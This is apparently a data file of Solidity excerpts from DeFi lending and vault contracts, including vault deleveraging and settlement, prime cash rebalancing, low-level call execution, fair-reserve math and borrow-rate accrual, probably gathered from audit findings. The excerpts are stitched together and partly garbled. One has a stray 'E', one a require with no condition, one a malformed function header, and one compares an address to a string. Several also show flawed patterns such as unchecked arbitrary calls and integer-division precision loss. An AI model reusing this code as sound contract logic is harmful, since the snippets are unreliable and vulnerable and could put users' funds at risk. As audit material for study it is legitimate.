TokenType.Ether) {\n        GenericToken.transferNativeTokenOut(account, withdrawAmount, withdrawWrappedNativeToken);\n    } else {\n        GenericToken.safeTransferOut(underlying.tokenAddress, account, withdrawAmount);\n    }\n\n    _postTransferPrimeCashUpdate(account, currencyId, netTransferExternal, underlying, primeRate);\n}\n```"
"```\nfunction deleverageAccount(\n    address account,\n    address vault,\n    address liquidator,\n    uint16 currencyIndex,\n    int256 depositUnderlyingInternal\n) external payable nonReentrant override returns (\n    uint256 vaultSharesToLiquidator,\n    int256 depositAmountPrimeCash\n) {\n    require(currencyIndex < 3);\n\n    (\n        VaultConfig memory vaultConfig,\n        VaultAccount memory vaultAccount,\n        VaultState memory vaultState\n    ) = _authenticateDeleverage(account, vault, liquidator);\n\n    PrimeRate memory pr;\n    (\n        depositUnderlyingInternal,\n        vaultSharesToLiquidator,\n        pr\n    ) = IVaultAccountHealth(address(this)).calculateDepositAmountInDeleverage(\n        currencyIndex,\n        vaultAccount,\n        vaultConfig,\n        vaultState,\n        depositUnderlyingInternal\n    );\n\n    uint16 currencyId = vaultConfig.borrowCurrencyId;\n    if (currencyIndex == 1) {\n        currencyId = vaultConfig.secondaryBorrowCurrencies[0];\n    } else if (currencyIndex == 2) {\n        currencyId = vaultConfig.secondaryBorrowCurrencies[1];\n    }\n\n    Token memory token = TokenHandler.getUnderlyingToken(currencyId);\n    (\n        /* */,\n        depositAmountPrimeCash\n    ) = TokenHandler.depositUnderlyingExternal(\n        liquidator,\n        currencyId,\n        token.convertToExternal(depositUnderlyingInternal),\n        pr,\n        false\n    );\n\n    vaultAccount.vaultShares = vaultAccount.vaultShares.sub(vaultSharesToLiquidator);\n    if (vaultAccount.maturity == Constants.PRIME_CASH_VAULT_MATURITY) {\n        _reduceAccountDebt(\n            vaultConfig,\n            vaultState,\n            vaultAccount,\n            pr,\n            currencyIndex,\n            depositUnderlyingInternal,\n            true\n        );\n        depositAmountPrimeCash = 0;\n    }\n\n    vaultAccount.setVaultAccountForLiquidation(\n        vaultConfig,\n        currencyIndex,\n        depositAmountPrimeCash,\n        true\n    );\n\n    emit VaultDeleverageAccount(\n        vault,\n        account,\n        currencyId,\n        vaultSharesToLiquidator,\n        depositAmountPrimeCash\n    );\n    emit VaultLiquidatorProfit(\n        vault,\n        account,\n        liquidator,\n        vaultSharesToLiquidator,\n        true\n    );\n\n    _transferVaultSharesToLiquidator(\n        liquidator,\n        vaultConfig,\n        vaultSharesToLiquidator,\n        vaultAccount.maturity\n    );\n\n    E\n```\nfunction _reduceAccountDebt(\n    VaultConfig memory vaultConfig,\n    VaultState memory vaultState,\n    VaultAccount memory vaultAccount,\n    PrimeRate memory primeRate,\n    uint256 currencyIndex,\n    int256 depositUnderlyingInternal,\n    bool checkMinBorrow\n) private {\n    if (currencyIndex == 0) {\n        vaultAccount.updateAccountDebt(vaultState, depositUnderlyingInternal, 0);\n        vaultState.setVaultState(vaultConfig);\n    } else {\n        PrimeRate[2] memory pr;\n        pr[currencyIndex - 1] = primeRate;\n\n        VaultSecondaryBorrow.updateAccountSecondaryDebt(\n            vaultConfig,\n            vaultAccount.account,\n            vaultAccount.maturity,\n            currencyIndex == 1? depositUnderlyingInternal : 0,\n            currencyIndex == 2? depositUnderlyingInternal : 0,\n            pr,\n            checkMinBorrow\n        );\n    }\n}\n```\n```\nFile: VaultSecondaryBorrow.sol\n\nif (checkMinBorrow) {\n    require(accountDebtOne == 0 || vaultConfig.minAccountSecondaryBorrow[0] <= -accountDebtOne, ""min borrow"");\n    require(accountDebtTwo == 0 || vaultConfig.minAccountSecondaryBorrow[1] <= -accountDebtTwo, ""min borrow"");\n}\n```"
"```\nFile: VaultValuation.sol\n\nint256 maxLiquidatorDepositLocal = _calculateDeleverageAmount(\n    vaultConfig,\n    h.vaultShareValueUnderlying,\n    h.totalDebtOutstandingInPrimary.neg(),\n    h.debtOutstanding[currencyIndex].neg(),\n    minBorrowSize,\n    exchangeRate,\n    er.rateDecimals\n);\n\nif (depositUnderlyingInternal < maxLiquidatorDepositLocal) {\n    if (h.debtOutstanding[currencyIndex].sub(depositUnderlyingInternal) < minBorrowSize) {\n        require(""Must Liquidate All Debt"");\n    }\n} else {\n    depositUnderlyingInternal = maxLiquidatorDepositLocal;\n}\n```"
"```\nfunction settleVaultAccount(address account, address vault) external override nonReentrant {\n    requireValidAccount(account);\n    require(account!= vault);\n\n    VaultConfig memory vaultConfig = VaultConfiguration.getVaultConfigStateful(vault);\n    VaultAccount memory vaultAccount = VaultAccountLib.getVaultAccount(account, vaultConfig);\n\n    (bool didSettle, bool didTransfer) = vaultAccount.settleVaultAccount(vaultConfig);\n    require(didSettle, ""No Settle"");\n\n    vaultAccount.accruePrimeCashFeesToDebt(vaultConfig);\n\n    vaultAccount.setVaultAccount({vaultConfig: vaultConfig, checkMinBorrow: false});\n\n    if (didTransfer) {\n        IVaultAccountHealth(address(this)).checkVaultAccountCollateralRatio(vault, account);\n    }\n}\n```\nfunction _authenticateDeleverage(\n    address account,\n    address vault,\n    address liquidator\n) private returns (\n    VaultConfig memory vaultConfig,\n    VaultAccount memory vaultAccount,\n    VaultState memory vaultState\n) {\n    requireValidAccount(liquidator);\n    require(liquidator!= vault);\n\n    require(account!= msg.sender);\n    require(account!= liquidator);\n\n    vaultConfig = VaultConfiguration.getVaultConfigStateful(vault);\n    require(vaultConfig.getFlag(VaultConfiguration.DISABLE_DELEVERAGE) == false);\n\n    if (vaultConfig.getFlag(VaultConfiguration.ONLY_VAULT_DELEVERAGE)) {\n        require(msg.sender == vault);\n    } else {\n        require(msg.sender == liquidator);\n    }\n\n    vaultAccount = VaultAccountLib.getVaultAccount(account, vaultConfig);\n\n    require(block.timestamp < vaultAccount.maturity, ""Must Settle"");\n\n    if (vaultAccount.maturity == Constants.PRIME_CASH_VAULT_MATURITY) {\n        vaultState = vaultAccount.accruePrimeCashFeesToDebtInLiquidation(vaultConfig);\n    } else {\n        vaultState = VaultStateLib.getVaultState(vaultConfig, vaultAccount.maturity);\n    }\n}\n```"
```\nreturn storedCashBalance.mul(pr.debtFactor).div(pr.supplyFactor)\n```\n```\nfunction testMod() public {\n    int256 result = -14;\n    result = result / 4;\n    console2.logInt(result);\n}\n```
"```\nfunction settleVaultAccount(address account, address vault) external override nonReentrant {\n    requireValidAccount(account);\n    require(account!= vault);\n\n    VaultConfig memory vaultConfig = VaultConfiguration.getVaultConfigStateful(vault);\n    VaultAccount memory vaultAccount = VaultAccountLib.getVaultAccount(account, vaultConfig);\n\n    (bool didSettle, bool didTransfer) = vaultAccount.settleVaultAccount(vaultConfig);\n    require(didSettle, ""No Settle"");\n\n    vaultAccount.accruePrimeCashFeesToDebt(vaultConfig);\n\n    vaultAccount.setVaultAccount({vaultConfig: vaultConfig, checkMinBorrow: false});\n\n    if (didTransfer) {\n        IVaultAccountHealth(address(this)).checkVaultAccountCollateralRatio(vault, account);\n    }\n}\n```\n```\n/// will first settle the vault account before taking any further actions.\n```\n```\n(bool didSettle, bool didTransfer) = vaultAccount.settleVaultAccount(vaultConfig);\n```\nfunction settleVaultAccount(address account, address vault) external override nonReentrant {\n    requireValidAccount(account);\n    require(account!= vault);\n\n    VaultConfig memory vaultConfig = VaultConfiguration.getVaultConfigStateful(vault);\n    VaultAccount memory vaultAccount = VaultAccountLib.getVaultAccount(account, vaultConfig);\n\n    (bool didSettle, bool didTransfer) = vaultAccount.settleVaultAccount(vaultConfig);\n    require(didSettle, ""No Settle"");\n}\n```\n```\nbool didTransferPrimary;\n(accountPrimeStorageValue, didTransferPrimary) = \n    repayAccountPrimeDebtAtSettlement(\n        vaultConfig.primeRate,\n        primeVaultState,\n        vaultConfig.borrowCurrencyId,\n        vaultConfig.vault,\n        vaultAccount.account,\n        vaultAccount.tempCashBalance,\n        accountPrimeStorageValue\n    );\n```\n```\nfunction repayAccountPrimeDebtAtSettlement(\n    PrimeRate memory pr,\n    VaultStateStorage storage primeVaultState,\n    uint16 currencyId,\n    address vault,\n    address account,\n    int256 accountPrimeCash,\n    int256 accountPrimeStorageValue\n) internal returns (int256 finalPrimeDebtStorageValue, bool didTransfer) {\n    didTransfer = false;\n    finalPrimeDebtStorageValue = accountPrimeStorageValue;\n\n    if (accountPrimeCash > 0) {\n        int256 netPrimeDebtRepaid = pr.convertUnderlyingToDebtStorage(\n            pr.convertToUnderlying(accountPrimeCash).neg()\n        );\n\n        int256 netPrimeDebtChange;\n        if (netPrimeDebtRepaid < accountPrimeStorageValue) {\n            netPrimeDebtChange = accountPrimeStorageValue;\n            finalPrimeDebtStorageValue = 0;\n\n            int256 primeCashRefund = pr.convertFromUnderlying(\n                pr.convertDebtStorageToUnderlying(netPrimeDebtChange.sub(accountPrimeStorageValue))\n            );\n            TokenHandler.withdrawPrimeCash(\n                account, currencyId, primeCashRefund, pr, false\n            );\n            didTransfer = true;\n        } else {\n            netPrimeDebtChange = netPrimeDebtRepaid;\n            finalPrimeDebtStorageValue = accountPrimeStorageValue.sub(netPrimeDebtChange);\n        }\n    }\n}\n```\nTokenHandler.withdrawPrimeCash(\n    account,\n    currencyId,\n    primeCashRefund,\n    pr,\n    false  // ETH will be transferred natively\n)\n```\n```\nfunction withdrawPrimeCash(\n    address account,\n    uint16 currencyId,\n    int256 primeCashToWithdraw,\n    PrimeRate memory primeRate,\n    bool withdrawWrappedNativeToken\n) internal returns (int256 netTransferExternal) {\n    if (primeCashToWithdraw == 0) return 0;\n    require(primeCashToWithdraw < 0);\n\n    Token memory underlying = getUnderlyingToken(currencyId);\n    netTransferExternal = convertToExternal(\n        underlying,\n        primeRate.convertToUnderlying(primeCashToWithdraw)\n    );\n\n    // Overflow not possible due to int256\n    uint256 withdrawAmount = uint256(netTransferExternal).neg();\n\n    _redeemMoneyMarketIfRequired(currencyId, underlying, withdrawAmount);\n\n    if (underlying.tokenType == TokenType.Ether) {\n        GenericToken.transferNativeTokenOut(account, withdrawAmount, withdrawWrappedNativeToken);\n    } else {\n        GenericToken.safeTransferOut(underlying.tokenAddress, account, withdrawAmount);\n    }\n\n    _postTransferPrimeCashUpdate(account, currencyId, netTransferExternal, underlying, primeRate);\n}\n```\n```\nif (underlying.tokenType == TokenType.Ether):\n    GenericToken.transferNativeTokenOut(account, withdrawAmount, withdrawWrappedNativeToken)\nelse:\n    GenericToken.safeTransferOut(underlying.tokenAddress, account, withdrawAmount)\n```\n```\nGenericToken.safeTransferOut(\n    underlying.tokenAddress,\n    account,\n    withdrawAmount\n)\n```\nERC20: \n    Any Non-Rebasing token. \n    ex. USDC, DAI, USDT (future), wstETH, WETH, WBTC, FRAX, CRV, etc."
"```\nfunction getAccountPrimeDebtBalance(uint16 currencyId, address account) external view override returns (int256 debtBalance) {\n    mapping(address => mapping(uint256 => BalanceStorage)) storage store = LibStorage.getBalanceStorage();\n    BalanceStorage storage balanceStorage = store[account][currencyId];\n    int256 cashBalance = balanceStorage.cashBalance;\n\n    debtBalance = cashBalance < 0? cashBalance : 0;\n}\n```"
"```\nfunction calculateRebalance(\n    IPrimeCashHoldingsOracle oracle,\n    uint8[] calldata rebalancingTargets\n) external view override onlyNotional returns (RebalancingData memory rebalancingData) {\n    address[] memory holdings = oracle.holdings();\n\n    for (uint256 i = 0; i < holdings.length; i++) {\n        address holding = holdings[i];\n        uint256 targetAmount = totalValue * rebalancingTargets[i] / uint256(Constants.PERCENTAGE_DECIMALS);\n        uint256 currentAmount = values[i];\n\n        redeemHoldings[i] = holding;\n        depositHoldings[i] = holding;\n    }\n\n    rebalancingData.redeemData = oracle.getRedemptionCalldataForRebalancing(redeemHoldings, redeemAmounts);\n    rebalancingData.depositData = oracle.getDepositCalldataForRebalancing(depositHoldings, depositAmounts);\n}\n```\n```\nfunction _executeDeposits(Token memory underlyingToken, DepositData[] memory deposits) private {\n    //..SNIP..\n    for (uint256 j; j < depositData.targets.length; ++j) {\n        // This will revert if the individual call reverts.\n        GenericToken.executeLowLevelCall(\n            depositData.targets[j],\n            depositData.msgValue[j],\n            depositData.callData[j]\n        );\n    }\n```\n```\nfunction executeMoneyMarketRedemptions(\n    //...SNIP...\n) {\n    for (uint256 j; j < data.targets.length; j++) {\n        GenericToken.executeLowLevelCall(data.targets[j], 0, data.callData[j]);\n    }\n```"
"```\nfunction _getNetCashAmountsUnderlying(\n    InterestRateParameters memory irParams,\n    MarketParameters memory market,\n    CashGroupParameters memory cashGroup,\n    int256 totalCashUnderlying,\n    int256 fCashToAccount,\n    uint256 timeToMaturity\n) private pure returns (\n    int256 postFeeCashToAccount,\n    int256 netUnderlyingToMarket,\n    int256 cashToReserve\n) {\n    uint256 utilization = getfCashUtilization(fCashToAccount, market.totalfCash, totalCashUnderlying);\n\n    if (utilization > uint256(Constants.RATE_PRECISION)) {\n        return (0, 0, 0);\n    }\n\n    uint256 preFeeInterestRate = getInterestRate(irParams, utilization);\n\n    int256 preFeeCashToAccount = fCashToAccount.divInRatePrecision(\n        getfCashExchangeRate(preFeeInterestRate, timeToMaturity)\n    ).neg();\n\n    uint256 postFeeInterestRate = getPostFeeInterestRate(irParams, preFeeInterestRate, fCashToAccount < 0);\n    postFeeCashToAccount = fCashToAccount.divInRatePrecision(\n        getfCashExchangeRate(postFeeInterestRate, timeToMaturity)\n    ).neg();\n}\n```\nfunction InterestRateCurve.sol {\n    (\n        int256 netUnderlyingToAccount,\n        int256 netUnderlyingToMarket,\n        int256 netUnderlyingToReserve\n    ) = _getNetCashAmountsUnderlying(\n        irParams,\n        market,\n        cashGroup,\n        totalCashUnderlying,\n        fCashToAccount,\n        timeToMaturity\n    );\n\n    {\n        // Do not allow utilization to go above 100 on trading, calculate the utilization after\n        // the trade has taken effect, meaning that fCash changes and cash changes are applied to\n        // the market totals.\n        market.totalfCash = market.totalfCash.subNoNeg(fCashToAccount);\n        totalCashUnderlying = totalCashUnderlying.add(netUnderlyingToMarket);\n\n        uint256 utilization = getfCashUtilization(0, market.totalfCash, totalCashUnderlying);\n        if (utilization > uint256(Constants.RATE_PRECISION)) return (0, 0);\n\n        uint256 newPreFeeImpliedRate = getInterestRate(irParams, utilization);\n\n        // Saves the preFeeInterestRate and fCash\n        market.lastImpliedRate = newPreFeeImpliedRate;\n    }\n}\n```\nfunction _executeLendBorrowTrade(\n   ..SNIP..\n    cashAmount = market.executeTrade(\n        account,\n        cashGroup,\n        fCashAmount,\n        market.maturity.sub(blockTime),\n        marketIndex\n    );\n\n    uint256 rateLimit = uint256(uint32(bytes4(trade << 104)));\n    if (rateLimit!= 0) {\n        if (tradeType == TradeActionType.Borrow) {\n            require(market.lastImpliedRate <= rateLimit, ""Trade failed, slippage"");\n        } else {\n            require(market.lastImpliedRate >= rateLimit, ""Trade failed, slippage"");\n        }\n    }\n```"
```\nrequire(\n    vaultAccount.lastUpdateBlockTime + Constants.VAULT_ACCOUNT_MIN_TIME <= block.timestamp\n)
"```\nfunction executeLowLevelCall(\n    address target,\n    uint256 msgValue,\n    bytes memory callData\n) internal {\n    (bool status, bytes memory returnData) = target.call{value: msgValue}(callData);\n    require(status, checkRevertMessage(returnData));\n}\n```\n```\nFile: TreasuryAction.sol\n\nfor (uint256 j; j < depositData.targets.length; ++j) {\n    GenericToken.executeLowLevelCall(\n        depositData.targets[j],\n        depositData.msgValue[j],\n        depositData.callData[j]\n    );\n}\n```"
"```\nfunction _executeRebalance(uint16 currencyId) private {\n    IPrimeCashHoldingsOracle oracle = PrimeCashExchangeRate.getPrimeCashHoldingsOracle(currencyId);\n    uint8[] memory rebalancingTargets = _getRebalancingTargets(currencyId, oracle.holdings());\n\n    (RebalancingData memory data) = REBALANCING_STRATEGY.calculateRebalance(oracle, rebalancingTargets);\n\n    (, uint256 totalUnderlyingValueBefore) = oracle.getTotalUnderlyingValueStateful();\n\n    // Process redemptions first\n    Token memory underlyingToken = TokenHandler.getUnderlyingToken(currencyId);\n    TokenHandler.executeMoneyMarketRedemptions(underlyingToken, data.redeemData);\n\n    // Process deposits\n    _executeDeposits(underlyingToken, data.depositData);\n\n    (, uint256 totalUnderlyingValueAfter) = oracle.getTotalUnderlyingValueStateful();\n\n    int256 underlyingDelta = totalUnderlyingValueBefore.toInt().sub(totalUnderlyingValueAfter.toInt());\n    require(underlyingDelta.abs() < Constants.REBALANCING_UNDERLYING_DELTA);\n}\n```\n```\nfunction getExchangeRateView() external view override returns (int256) {\n    uint256 exchangeRate = cToken.interestRateModel() == INTEREST_RATE_MODEL\n       ? _viewExchangeRate()\n        : cToken.exchangeRateStored();\n    _checkExchangeRate(exchangeRate);\n\n    return int256(exchangeRate);\n}\n```"
"```\nfunction exitVault(\n    address account,\n    address vault,\n    address receiver,\n    uint256 vaultSharesToRedeem,\n    uint256 lendAmount,\n    uint32 minLendRate,\n    bytes calldata exitVaultData\n) external payable override nonReentrant returns (uint256 underlyingToReceiver) {\n    // If insufficient strategy tokens are redeemed (or if it is set to zero), then\n    // redeem with debt repayment will recover the repayment from the account's wallet\n    // directly.\n    underlyingToReceiver = underlyingToReceiver.add(vaultConfig.redeemWithDebtRepayment(\n        vaultAccount, receiver, vaultSharesToRedeem, exitVaultData\n    ));\n}\n```\n```\nVaultAccountAction.exitVault\n  └── VaultConfiguration.redeemWithDebtRepayment\n    └── VaultConfiguration._redeem\n      └── IStrategyVault.redeemFromNotional\n        └── MetaStable2TokenAuraVault._redeemFromNotional\n          └── MetaStable2TokenAuraHelper.redeem\n            └── Balancer2TokenPoolUtils._redeem\n              └── StrategyUtils._redeemStrategyTokens\n```\n```\nfunction _redeemStrategyTokens(\n    StrategyContext memory strategyContext,\n    uint256 strategyTokens\n) internal returns (uint256 poolClaim) {\n    poolClaim = _convertStrategyTokensToPoolClaim(strategyContext, strategyTokens);\n\n    if (poolClaim == 0) {\n        revert Errors.ZeroPoolClaim();\n    }\n}\n```"
```\nif (vaultAccount.tempCashBalance < 0) {\n    int256 x = vaultConfig.primeRate.convertToUnderlying(vaultAccount.tempCashBalance).neg();\n    underlyingExternalToRepay = underlyingToken.convertToUnderlyingExternalWithAdjustment(x).toUint();\n} else {\n    require(vaultAccount.tempCashBalance == 0);\n}\n```
"```\nFile: ProportionalRebalancingStrategy.sol\n\nfor (uint256 i; i < holdings.length;) {\n    address holding = holdings[i];\n    uint256 targetAmount = totalValue * rebalancingTargets[i] / uint256(Constants.PERCENTAGE_DECIMALS);\n    uint256 currentAmount = values[i];\n\n    redeemHoldings[i] = holding;\n    depositHoldings[i] = holding;\n\n    if (targetAmount < currentAmount) {\n        unchecked {\n            redeemAmounts[i] = currentAmount - targetAmount;\n        }\n    } else if (currentAmount < targetAmount) {\n        unchecked {\n            depositAmounts[i] = targetAmount - currentAmount;\n        }\n    }\n\n    unchecked {\n        i++;\n    }\n}\n```\nFile: ProportionalRebalancingStrategy.sol\n\nrebalancingData.redeemData = oracle.getRedemptionCalldataForRebalancing(redeemHoldings, redeemAmounts);\nrebalancingData.depositData = oracle.getDepositCalldataForRebalancing(depositHoldings, depositAmounts);\n```\n```\nfunction deposit(\n    address _reserve,\n    uint256 _amount,\n    uint16 _referralCode\n)\n    external\n    payable\n    nonReentrant\n    onlyActiveReserve(_reserve)\n    onlyUnfreezedReserve(_reserve)\n    onlyAmountGreaterThanZero(_amount)\n{\n```\n```\nfunction redeemUnderlying(\n    address _reserve,\n    address payable _user,\n    uint256 _amount,\n    uint256 _aTokenBalanceAfterRedeem\n)\n    external\n    nonReentrant\n    onlyOverlyingAToken(_reserve)\n    onlyActiveReserve(_reserve)\n    onlyAmountGreaterThanZero(_amount)\n{\n```"
"```\nFile: PrimeRateLib.sol\n\nint256 fCashDebtInReserve = -int256(s.fCashDebtHeldInSettlementReserve);\nint256 primeCashInReserve = int256(s.primeCashHeldInSettlementReserve);\n\nif (fCashDebtInReserve > 0 || primeCashInReserve > 0) {\n    int256 settledPrimeCash = convertFromUnderlying(settlementRate, fCashDebtInReserve);\n    int256 excessCash;\n    if (primeCashInReserve > settledPrimeCash) {\n        excessCash = primeCashInReserve - settledPrimeCash;\n        BalanceHandler.incrementFeeToReserve(currencyId, excessCash);\n    }\n\n    Emitter.emitSettlefCashDebtInReserve(\n        currencyId, maturity, fCashDebtInReserve, settledPrimeCash, excessCash\n    );\n}"
"```\nfunction _executeRebalance(uint16 currencyId) private {\n    IPrimeCashHoldingsOracle oracle = PrimeCashExchangeRate.getPrimeCashHoldingsOracle(currencyId);\n    uint8[] memory rebalancingTargets = _getRebalancingTargets(currencyId, oracle.holdings());\n\n    (RebalancingData memory data) = REBALANCING_STRATEGY.calculateRebalance(oracle, rebalancingTargets);\n\n    (, uint256 totalUnderlyingValueBefore) = oracle.getTotalUnderlyingValueStateful();\n\n    // Process redemptions first\n    Token memory underlyingToken = TokenHandler.getUnderlyingToken(currencyId);\n    TokenHandler.executeMoneyMarketRedemptions(underlyingToken, data.redeemData);\n\n    // Process deposits\n    _executeDeposits(underlyingToken, data.depositData);\n\n    (, uint256 totalUnderlyingValueAfter) = oracle.getTotalUnderlyingValueStateful();\n\n    int256 underlyingDelta = totalUnderlyingValueBefore.toInt().sub(totalUnderlyingValueAfter.toInt());\n    require(underlyingDelta.abs() < Constants.REBALANCING_UNDERLYING_DELTA);\n}\n```"
"```\nfunction _executeRebalance(uint16 currencyId) private {\n    IPrimeCashHoldingsOracle oracle = PrimeCashExchangeRate.getPrimeCashHoldingsOracle(currencyId);\n    uint8[] memory rebalancingTargets = _getRebalancingTargets(currencyId, oracle.holdings());\n\n    (RebalancingData memory data) = REBALANCING_STRATEGY.calculateRebalance(oracle, rebalancingTargets);\n\n    (, uint256 totalUnderlyingValueBefore) = oracle.getTotalUnderlyingValueStateful();\n\n    // Process redemptions first\n    Token memory underlyingToken = TokenHandler.getUnderlyingToken(currencyId);\n    TokenHandler.executeMoneyMarketRedemptions(underlyingToken, data.redeemData);\n\n    // Process deposits\n    _executeDeposits(underlyingToken, data.depositData);\n\n    (, uint256 totalUnderlyingValueAfter) = oracle.getTotalUnderlyingValueStateful();\n\n    int256 underlyingDelta = totalUnderlyingValueBefore.toInt().sub(totalUnderlyingValueAfter.toInt());\n    require(underlyingDelta.abs() < Constants.REBALANCING_UNDERLYING_DELTA);\n}\n```"
"```\nfunction updateAccountDebt(\n    //...SNIP...\n    // Truncate dust balances towards zero\n    if (0 < vaultState.totalDebtUnderlying && vaultState.totalDebtUnderlying < 10) {\n        vaultState.totalDebtUnderlying = 0;\n    }\n)\n```\n```\nfunction _updateTotalSecondaryDebt(\n    VaultConfig memory vaultConfig,\n    address account,\n    uint16 currencyId,\n    uint256 maturity,\n    int256 netUnderlyingDebt,\n    PrimeRate memory pr\n) private {\n    VaultStateStorage storage balance = LibStorage.getVaultSecondaryBorrow()\n        [vaultConfig.vault][maturity][currencyId];\n    int256 totalDebtUnderlying = VaultStateLib.readDebtStorageToUnderlying(pr, maturity, balance.totalDebt);\n\n    totalDebtUnderlying = totalDebtUnderlying.add(netUnderlyingDebt);\n    VaultStateLib.setTotalDebtStorage(\n        balance, pr, vaultConfig, currencyId, maturity, totalDebtUnderlying, false\n    );\n}\n```"
"```\nfunction _setVaultAccount(\n    // An account must maintain a minimum borrow size in order to enter the vault. If the account\n    // wants to exit under the minimum borrow size it must fully exit so that we do not have dust\n    // accounts that become insolvent.\n    if (\n        vaultAccount.accountDebtUnderlying.neg() < vaultConfig.minAccountBorrowSize &&\n        // During local currency liquidation and settlement, the min borrow check is skipped\n        checkMinBorrow\n    ) {\n        // NOTE: use 1 to represent the minimum amount of vault shares due to rounding in the\n        // vaultSharesToLiquidator calculation\n        require(vaultAccount.accountDebtUnderlying == 0 || vaultAccount.vaultShares <= 1, ""Min Borrow"");\n    }\n```"
"```\nfunction _authenticateDeleverage(\n    address account,\n    address vault,\n    address liquidator\n) private returns (\n    VaultConfig memory vaultConfig,\n    VaultAccount memory vaultAccount,\n    VaultState memory vaultState\n) {\n    requireValidAccount(liquidator);\n    require(liquidator!= vault);\n\n    require(account!= msg.sender);\n    require(account!= liquidator);\n\n    vaultConfig = VaultConfiguration.getVaultConfigStateful(vault);\n    require(vaultConfig.getFlag(VaultConfiguration.DISABLE_DELEVERAGE) == false);\n\n    if (vaultConfig.getFlag(VaultConfiguration.ONLY_VAULT_DELEVERAGE)) {\n        require(msg.sender == vault);\n    } else {\n        require(msg.sender == liquidator);\n    }\n\n    vaultAccount = VaultAccountLib.getVaultAccount(account, vaultConfig);\n\n    require(block.timestamp < vaultAccount.maturity, ""Must Settle"");\n\n    if (vaultAccount.maturity == Constants.PRIME_CASH_VAULT_MATURITY) {\n        vaultState = vaultAccount.accruePrimeCashFeesToDebtInLiquidation(vaultConfig);\n    } else {\n        vaultState = VaultStateLib.getVaultState(vaultConfig, vaultAccount.maturity);\n    }\n}\n```"
```\ndaiAToken.balance = 30000\nwethDebtToken.balance = 10\n\nthe_price_of_WETH_when_the_trade_was_opened_was ~ 3000 DAI\n```
"```\n_tradeAmounts[i] = IERC20(_tradeAssets[i]).balanceOf(address(this))\n\n_lendingPoolDeposit(_tradeAssets[i], _tradeAmounts[i], 1)\n```"
"```\nfor (uint i = 0; i < rewardTokens.length; i++) {\n    IERC20Upgradeable(rewardTokens[i]).safeTransfer(\n        msg.sender,\n        rewards[i]\n    );\n}\n```\n```\nIBank.Position memory pos = bank.getCurrentPositionInfo();\nif (pos.collateralSize > 0) {\n    (uint256 pid, ) = wAuraPools.decodeId(pos.collId);\n    if (param.farmingPoolId!= pid) {\n        revert Errors.INCORRECT_PID(param.farmingPoolId);\n    }\n    if (pos.collToken!= address(wAuraPools)) {\n        revert Errors.INCORRECT_COLTOKEN(pos.collToken);\n    }\n    bank.takeCollateral(pos.collateralSize);\n    wAuraPools.burn(pos.collId, pos.collateralSize);\n    _doRefundRewards(AURA);\n}\n```"
"```\naddress vault = strategies[param.strategyId].vault;\n_doPutCollateral(\n    vault,\n    IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(address(this))\n);\n```"
"```\nfunction computeFairReserves(\n    uint256 resA,\n    uint256 resB,\n    uint256 wA,\n    uint256 wB,\n    uint256 pxA,\n    uint256 pxB\n) internal pure returns (uint256 fairResA, uint256 fairResB) {\n    uint256 r0 = resA / resB;\n    uint256 r1 = (wA * pxB) / (wB * pxA);\n    if (r0 > r1) {\n        uint256 ratio = r1 / r0;\n        fairResA = resA * (ratio ** wB);\n        fairResB = resB / (ratio ** wA);\n    } else {\n        uint256 ratio = r0 / r1;\n        fairResA = resA / (ratio ** wB);\n        fairResB = resB * (ratio ** wA);\n    }\n}\n```"
"```\nfeeManager = config_.feeManager()\n```\n```\nwithdrawAmount = config.feeManager().doCutVaultWithdrawFee(\n    address(uToken),\n    shareAmount\n)"
"```\naddress burnToken = address(ISoftVault(strategy.vault).uToken());\nif (collSize > 0) {\n    if (posCollToken!= address(wrapper)) {\n        revert Errors.INCORRECT_COLTOKEN(posCollToken);\n    }\n    bank.takeCollateral(collSize);\n    wrapper.burn(burnToken, collSize);\n    _doRefund(burnToken);\n}\n```\n```\n_doPutCollateral(\n    vault,\n    IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(address(this))\n);"
"```\nIERC20(asset).safeTransferFrom(msg.sender, address(this), amount);\n\n(address approveTarget, address swapTarget, bytes memory data) = abi.decode(param, (address, address, bytes));\n\nif (asset == ""USDT"") {\n    IERC20(asset).approve(approveTarget, 0);\n    IERC20(asset).approve(approveTarget, amount);\n}\n\n(bool success,) = swapTarget.call(data);\n\nif (success == false) {\n    assembly {\n        let ptr := mload(0x40)\n        let size := returndatasize()\n        returndatacopy(ptr, 0, size)\n        revert(ptr, size)\n    }\n}\n```"
"```\nfunction getTRate() public view returns (uint256) {\n    uint256 timeDifference = block.timestamp - uint256(lastUpdateTimestamp);\n    return (t0Rate + (borrowFeeRate * timeDifference) / JOJOConstant.SECONDS_PER_YEAR);\n}\n```\n```\nconstructor(\n    uint256 _maxReservesNum,\n    address _insurance,\n    address _JUSD,\n    address _JOJODealer,\n    uint256 _maxPerAccountBorrowAmount,\n    uint256 _maxTotalBorrowAmount,\n    uint256 _borrowFeeRate,\n    address _primaryAsset\n) {\n    t0Rate = JOJOConstant.ONE;\n}\n```\n```\nlibrary JOJOConstant {\n    uint256 public constant SECONDS_PER_YEAR = 31536000;\n}\n```\n```\nfunction _borrow(\n    DataTypes.UserInfo storage user,\n    bool isDepositToJOJO,\n    address to,\n    uint256 tAmount,\n    address from\n) internal {\n    uint256 tRate = getTRate();\n    uint256 t0Amount = tAmount.decimalRemainder(tRate)\n       ? tAmount.decimalDiv(tRate)\n        : tAmount.decimalDiv(tRate) + 1;\n    user.t0BorrowBalance += t0Amount;\n}\n```"
"```\nfunction execute(address to, bytes calldata data, uint256 value) external onlyOwner returns (bytes memory) {\n    require(to!= address(0));\n    (bool success, bytes memory returnData) = to.call{value: value}(data);\n    if (!success) {\n        assembly {\n            let ptr := mload(0x40)\n            let size := returndatasize()\n            returndatacopy(ptr, 0, size)\n            revert(ptr, size)\n        }\n    }\n    emit ExecuteTransaction(owner, address(this), to, data, value);\n    return returnData;\n}\n```"
"```\nfunction handleBadDebt(Types.State storage state, address liquidatedTrader)\n    external\n{\n    if (\n        state.openPositions[liquidatedTrader].length == 0 &&\n       !Liquidation._isSafe(state, liquidatedTrader)\n    ) {\n        int256 primaryCredit = state.primaryCredit[liquidatedTrader];\n        uint256 secondaryCredit = state.secondaryCredit[liquidatedTrader];\n        state.primaryCredit[state.insurance] += primaryCredit;\n        state.secondaryCredit[state.insurance] += secondaryCredit;\n        state.primaryCredit[liquidatedTrader] = 0;\n        state.secondaryCredit[liquidatedTrader] = 0;\n        emit HandleBadDebt(\n            liquidatedTrader,\n            primaryCredit,\n            secondaryCredit\n        );\n    }\n}\n```"
